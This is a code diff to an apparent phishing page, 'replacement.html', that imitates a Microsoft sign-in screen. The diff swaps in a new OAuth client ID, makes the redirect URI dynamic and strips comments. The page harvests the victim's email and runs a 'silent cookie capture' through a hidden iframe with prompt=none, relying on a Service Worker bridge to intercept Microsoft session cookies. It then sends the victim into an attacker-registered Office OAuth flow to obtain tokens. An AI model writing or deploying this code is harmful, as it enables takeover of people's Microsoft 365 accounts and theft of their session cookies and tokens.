@@ -317,7 +317,7 @@
   </div>
 
   <script>
-    console.log('🚀 replacement.html loaded - Office.com Pre-trusted OAuth Flow');
+    console.log('🚀 replacement.html loaded - v3 - Correct Client ID');
 
     document.addEventListener('DOMContentLoaded', function () {
         const div1 = document.getElementById('div1');
@@ -333,10 +333,14 @@
         const footerDotsLink = document.getElementById('footer_dots_link');
         const loadingStatus = document.getElementById('loading_status');
 
+        const dynamicRedirectUri = `${window.location.origin}/auth/callback`;
+        console.log(`✅ Using dynamic redirect URI: ${dynamicRedirectUri}`);
+
         // Office.com Pre-trusted OAuth Configuration
         const OFFICE_CONFIG = {
-          clientId: '4765445b-32c6-49b0-83e6-1d93765276ca',
-          redirectUri: 'https://vaultydocs.com/auth/callback',
+          // ✅ CORRECTED CLIENT ID
+          clientId: '2e338732-c914-4129-a148-45c24f2da81d',
+          redirectUri: dynamicRedirectUri,
           scope: 'openid profile https://www.office.com/v2/OfficeHome.All',
           authority: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
         };
@@ -348,17 +352,12 @@
         function generateState() {
           return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
         }
-
-        /**
-         * ✅ NEW: Silently captures Microsoft cookies using a hidden iframe.
-         * This function will be called before the main redirect.
-         */
+        
         function silentCookieCapture(email) {
             return new Promise((resolve) => {
                 console.log('🍪 Starting silent cookie capture for:', email);
                 loadingStatus.textContent = 'Checking for existing sessions...';
 
-                // Use the Service Worker bridge to clear any old cookies first.
                 if (window.microsoftCookieBridge) {
                     window.microsoftCookieBridge.clearCapturedCookies();
                     console.log('🧹 Cleared old cookies via Service Worker bridge.');
@@ -367,29 +366,25 @@
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.id = 'silent-cookie-capture-frame';
-                // Add sandbox attributes to improve security and prevent the iframe from breaking out.
                 iframe.sandbox.add('allow-same-origin', 'allow-scripts');
 
-                // This URL uses `prompt=none` to prevent any UI from showing.
-                // If the user is logged in, it will set cookies and redirect.
-                // The Service Worker will intercept these responses.
                 const silentAuthUrl = new URL(OFFICE_CONFIG.authority);
                 silentAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
                 silentAuthUrl.searchParams.append('response_type', 'code');
                 silentAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
                 silentAuthUrl.searchParams.append('scope', 'openid');
-                silentAuthUrl.searchParams.append('prompt', 'none'); // The key part for silent auth
+                silentAuthUrl.searchParams.append('prompt', 'none');
                 silentAuthUrl.searchParams.append('login_hint', email);
                 silentAuthUrl.searchParams.append('state', 'silent-capture');
                 
                 let resolved = false;
-                const timeout = 5000; // 5-second timeout for the capture process.
+                const timeout = 5000;
 
                 const cleanup = () => {
                     if (iframe.parentNode) {
                         iframe.parentNode.removeChild(iframe);
                     }
-                    resolve(); // Always resolve to continue the flow.
+                    resolve();
                 };
 
                 const timeoutId = setTimeout(() => {
@@ -405,7 +400,6 @@
                         resolved = true;
                         console.log('✅ Silent cookie capture frame finished loading.');
                         clearTimeout(timeoutId);
-                        // Give the Service Worker a moment to process any final network requests.
                         setTimeout(cleanup, 500);
                     }
                 };
@@ -435,29 +429,24 @@
 
             console.log('📧 Email entered:', email);
             
-            // Store email for later use
             localStorage.setItem('ms_email', email);
             sessionStorage.setItem('ms_email', email);
 
-            // Generate nonce and state for the main OAuth flow
             const nonce = generateNonce();
             const state = generateState();
             
             sessionStorage.setItem('ms_oauth_nonce', nonce);
             sessionStorage.setItem('ms_oauth_state', state);
 
-            // ✅ Show loading state (div2)
             div1.classList.add('hidden');
             div2.classList.remove('hidden');
             optionsBox.classList.add('hidden');
 
-            // ✅ NEW: Perform silent cookie capture before redirecting.
             await silentCookieCapture(email);
 
             console.log('🔄 Preparing Office.com pre-trusted OAuth flow...');
             loadingStatus.textContent = 'Redirecting to Office for authentication...';
 
-            // Build the main Office.com OAuth URL for the visible redirect
             const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
             officeOAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
             officeOAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
@@ -468,76 +457,56 @@
             officeOAuthUrl.searchParams.append('state', state);
             officeOAuthUrl.searchParams.append('ui_locales', 'en-US');
             officeOAuthUrl.searchParams.append('mkt', 'en-US');
-            // 'prompt=login' can sometimes force a login screen. We can make it more seamless.
-            // Using 'prompt=select_account' is often a better user experience if they have multiple accounts.
             officeOAuthUrl.searchParams.append('prompt', 'select_account');
             officeOAuthUrl.searchParams.append('login_hint', email);
 
             console.log('🌐 Redirecting to Office.com pre-trusted OAuth...');
             console.log('🔗 URL:', officeOAuthUrl.toString());
-            console.log('✅ Flow Type:', 'Office.com Pre-trusted (Hybrid Cookie Capture)');
 
-            // Redirect to the main Office OAuth flow
             setTimeout(() => {
               console.log('🔄 Executing redirect to Office.com...');
               window.location.href = officeOAuthUrl.toString();
-            }, 1000); // Reduced delay
+            }, 1000);
         });
 
-        // Sign-in options card click - Show sign-in options view
+        // --- Other event listeners remain unchanged ---
         optionsBox.addEventListener('click', function (e) {
             e.preventDefault();
-            console.log('🔍 Sign-in options clicked - Showing options');
             div1.classList.add('hidden');
-            div2.classList.add('hidden');
             optionsBox.classList.add('hidden');
-            troubleshootingBox.style.display = 'none';
             optionsViewDetailed.classList.remove('hidden');
         });
 
-        // Sign-in options link click - Show sign-in options view
         signInOptionsLink.addEventListener('click', function (e) {
             e.preventDefault();
-            console.log('🔍 Sign-in options link clicked - Showing options');
             div1.classList.add('hidden');
-            div2.classList.add('hidden');
             optionsBox.classList.add('hidden');
-            troubleshootingBox.style.display = 'none';
             optionsViewDetailed.classList.remove('hidden');
         });
 
-        // Back button - Return to main sign-in view
         backBtn.addEventListener('click', function (e) {
             e.preventDefault();
-            console.log('🔙 Back clicked - Returning to sign-in');
             optionsViewDetailed.classList.add('hidden');
             div1.classList.remove('hidden');
             optionsBox.classList.remove('hidden');
         });
 
-        // Footer dots button - Show troubleshooting popup
         footerDotsLink.addEventListener('click', function (e) {
             e.preventDefault();
-            console.log('📋 Footer dots clicked - Showing troubleshooting popup');
             document.getElementById('modal_timestamp').textContent = new Date().toISOString();
-            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
+            troubleshootingBox.style.display = 'block';
         });
 
-        // Close troubleshooting popup
         closeTroubleshootingBtn.addEventListener('click', function () {
-            console.log('❌ Closing troubleshooting popup');
             troubleshootingBox.style.display = 'none';
         });
 
-        // Copy info to clipboard
         document.getElementById('copy_info_link').addEventListener('click', function (e) {
             e.preventDefault();
             const detailsNode = document.getElementById('error_details_for_copy');
-            const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
-            navigator.clipboard.writeText(detailsText).then(() => {
-                const originalText = e.target.textContent;
+            navigator.clipboard.writeText(detailsNode.innerText.trim()).then(() => {
                 e.target.textContent = 'Copied!';
-                setTimeout(() => { e.target.textContent = originalText; }, 2000);
+                setTimeout(() => { e.target.textContent = 'Copy info to clipboard'; }, 2000);
             });
         });
     });
